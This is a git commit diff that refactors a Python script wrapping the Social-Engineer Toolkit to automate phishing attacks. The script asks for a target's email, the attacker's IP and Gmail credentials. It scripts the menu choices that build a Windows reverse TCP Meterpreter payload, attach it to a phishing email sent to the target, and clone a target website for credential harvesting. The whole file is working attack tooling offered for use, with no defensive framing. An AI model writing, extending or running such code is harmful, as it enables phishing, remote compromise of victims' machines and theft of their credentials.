ac5a244755bb2db442531e7653c58ff3564a06a5
randompolymath <alexis.hausmann@gmx.ch>
2024-06-12 12:34:45 +0000

    Update setoolkit.py

--- setoolkit.py
+++ setoolkit.py
@@ -1,52 +1,47 @@
 import subprocess
 
-option = input("Do you want to phish using 1. email, 2. phone nr. or 3. clone page?: ")
-if option == "1":
-    ip = input("your ip to listen to the shell: ")
-    targetmail = input("Mail of target?: ")
-    mail = input("Your Gmail?: ")
-    password = input("Gmail password?: ")
-    filename = input("What should the file be called?: ")
-
+def run_setoolkit(commands):
     process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-    commands = [
-        "1\n",
-        "1\n",
-        "1\n",
-        "13\n",
-        "2\n",
-        "1\n",
-        ip,
-        "443\n",
-        "2\n",
-        "test.pdf\n",
-        "1\n",
-        "1\n",
-        "3\n",
-        targetmail,
-        "1\n",
-        mail,
-        "test\n",
-        password,
-        "yes\n",
-        "yes\n",
-        "yes\n",
-    ]
-
     for command in commands:
         process.stdin.write(command)
     process.stdin.close()
     process.wait()
 
-elif option == "2":
-    # Placeholder for phone number phishing
-    pass
+def email_phishing():
+    ip = input("Your IP to listen to the shell: ")
+    targetmail = input("Mail of target?: ")
+    mail = input("Your Gmail?: ")
+    password = input("Gmail password?: ")
+    filename = input("What should the file be called?: ")
 
-elif option == "3":
+    commands = [
+        "1\n",  # Social-Engineering Attacks
+        "1\n",  # Spear-Phishing Attack Vectors
+        "1\n",  # Perform a Mass Email Attack
+        "13\n",  # Create a FileFormat Payload
+        "2\n",  # Windows Reverse_TCP Meterpreter
+        "1\n",  # Windows Reverse_TCP Meterpreter
+        f"{ip}\n",  # IP Address
+        "443\n",  # Port
+        "2\n",  # Create a Payload and Listener
+        f"{filename}\n",  # Payload name
+        "1\n",  # Use built-in email attack
+        "1\n",  # Single Email Address
+        "3\n",  # GMail
+        f"{targetmail}\n",  # Target email
+        "1\n",  # Send email
+        f"{mail}\n",  # Your email
+        "test\n",  # Email subject
+        f"{password}\n",  # Email password
+        "yes\n",  # Send email
+        "yes\n",  # Are you sure?
+        "yes\n"  # Do you want to send another email?
+    ]
+    
+    run_setoolkit(commands)
+
+def clone_page():
     url = input("Target URL?: ")
-
-    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
     commands = [
         "2\n",  # Website Attack Vectors
@@ -55,11 +50,15 @@ elif option == "3":
         f"{url}\n"  # URL to clone
     ]
 
-    for command in commands:
-        process.stdin.write(command)
-    process.stdin.close()
-    process.wait()
+    run_setoolkit(commands)
 
+option = input("Do you want to phish using 1. email, 2. phone nr., or 3. clone page?: ")
+
+if option == "1":
+    email_phishing()
+elif option == "2":
+    print("Phone number phishing is not implemented.")
+elif option == "3":
+    clone_page()
 else:
-    print("Invalid option. Exiting.")
-    quit()
+    print("Invalid option.")
